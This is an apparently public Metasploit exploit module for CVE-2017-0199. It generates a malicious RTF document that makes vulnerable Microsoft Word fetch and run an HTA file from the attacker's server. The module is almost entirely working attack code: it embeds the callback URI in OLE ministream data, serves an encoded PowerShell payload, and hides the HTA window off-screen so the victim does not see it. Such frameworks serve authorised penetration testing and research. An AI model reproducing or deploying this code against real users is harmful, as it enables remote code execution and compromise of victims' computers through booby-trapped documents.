##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Microsoft Office Word Malicious Hta Execution",
      'Description'    => %q{
        This module creates a malicious RTF file that when opened in
        vulnerable versions of Microsoft Word will lead to code execution.
        The flaw exists in how a olelink object can make a http(s) request,
        and execute hta code in response.

        This bug was originally seen being exploited in the wild starting
        in Oct 2016. This module was created by reversing a public
        malware sample.
      },
      'Author'         =>
        [
          'Haifei Li', # vulnerability analysis
          'ryHanson',
          'wdormann',
          'DidierStevens',
          'vysec',
          'Nixawk', # module developer
          'sinn3r'  # msf module improvement
        ],
      'License'        => MSF_LICENSE,
      'References'     => [
        ['CVE', '2017-0199'],
        ['URL', 'https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html'],
        ['URL', 'https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/'],
        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html'],
        ['URL', 'https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0251.html'],
        ['URL', 'https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.pdf'],
        ['URL', 'https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/'],
        ['URL', 'https://www.hybrid-analysis.com/sample/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e?environmentId=100'],
        ['URL', 'https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/'],
        ['URL', 'https://www.microsoft.com/en-us/download/details.aspx?id=10725'],
        ['URL', 'https://msdn.microsoft.com/en-us/library/dd942294.aspx'],
        ['URL', 'https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CFB/[MS-CFB].pdf'],
        ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199']
      ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Microsoft Office Word', {} ]
        ],
      'DefaultOptions' =>
        {
          'DisablePayloadHandler' => false
        },
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 14 2017'))

    register_options([
      OptString.new('FILENAME', [ true, 'The file name.', 'msf.doc']),
      OptString.new('URIPATH',  [ true, 'The URI to use for the HTA file', 'default.hta'])
    ], self.class)
  end

  def generate_uri
    uri_maxlength = 112

    host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
    scheme = datastore['SSL'] ? 'https' : 'http'

    uri = "#{scheme}://#{host}:#{datastore['SRVPORT']}#{'/' + Rex::FileUtils.normalize_unix_path(datastore['URIPATH'])}"
    uri = Rex::Text.hexify(Rex::Text.to_unicode(uri))
    uri.delete!("\n")
    uri.delete!("\\x")
    uri.delete!("\\")

    padding_length = uri_maxlength * 2 - uri.length
    fail_with(Failure::BadConfig, "please use a uri < #{uri_maxlength} bytes ") if padding_length.negative?
    padding_length.times { uri << "0" }
    uri
  end

  def create_ole_ministream_data
    # require 'rex/ole'
    # ole = Rex::OLE::Storage.new('cve-2017-0199.bin', Rex::OLE::STGM_READ)
    # ministream = ole.instance_variable_get(:@ministream)
    # ministream_data = ministream.instance_variable_get(:@data)

    ministream_data = ""
    ministream_data << "01000002090000000100000000000000" # 00000000: ................
    ministream_data << "0000000000000000a4000000e0c9ea79" # 00000010: ...............y
    ministream_data << "f9bace118c8200aa004ba90b8c000000" # 00000020: .........K......
    ministream_data << generate_uri
    ministream_data << "00000000795881f43b1d7f48af2c825d" # 000000a0: ....yX..;..H.,.]
    ministream_data << "c485276300000000a5ab0000ffffffff" # 000000b0: ..'c............
    ministream_data << "0609020000000000c000000000000046" # 000000c0: ...............F
    ministream_data << "00000000ffffffff0000000000000000" # 000000d0: ................
    ministream_data << "906660a637b5d2010000000000000000" # 000000e0: .f`.7...........
    ministream_data << "00000000000000000000000000000000" # 000000f0: ................
    ministream_data << "100203000d0000000000000000000000" # 00000100: ................
    ministream_data << "00000000000000000000000000000000" # 00000110: ................
    ministream_data << "00000000000000000000000000000000" # 00000120: ................
    ministream_data << "00000000000000000000000000000000" # 00000130: ................
    ministream_data << "00000000000000000000000000000000" # 00000140: ................
    ministream_data << "00000000000000000000000000000000" # 00000150: ................
    ministream_data << "00000000000000000000000000000000" # 00000160: ................
    ministream_data << "00000000000000000000000000000000" # 00000170: ................
    ministream_data << "00000000000000000000000000000000" # 00000180: ................
    ministream_data << "00000000000000000000000000000000" # 00000190: ................
    ministream_data << "00000000000000000000000000000000" # 000001a0: ................
    ministream_data << "00000000000000000000000000000000" # 000001b0: ................
    ministream_data << "00000000000000000000000000000000" # 000001c0: ................
    ministream_data << "00000000000000000000000000000000" # 000001d0: ................
    ministream_data << "00000000000000000000000000000000" # 000001e0: ................
    ministream_data << "00000000000000000000000000000000" # 000001f0: ................
    ministream_data
  end

  def create_rtf_format
    template_path = ::File.join(Msf::Config.data_directory, "exploits", "cve-2017-0199.rtf")
    template_rtf = ::File.open(template_path, 'rb')

    data = template_rtf.read(template_rtf.stat.size)
    data.gsub!('MINISTREAM_DATA', create_ole_ministream_data)
    template_rtf.close
    data
  end

  def on_request_uri(cli, req)
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      'win',
      p.encoded,
      'hta-psh',
      { :arch => ARCH_X86, :platform => 'win' }
    )

    # This allows the HTA window to be invisible
    data.sub!(/\n/, "\nwindow.moveTo -4000, -4000\n")

    send_response(cli, data, 'Content-Type' => 'application/hta')
  end

  def exploit
    file_create(create_rtf_format)
    super
  end
end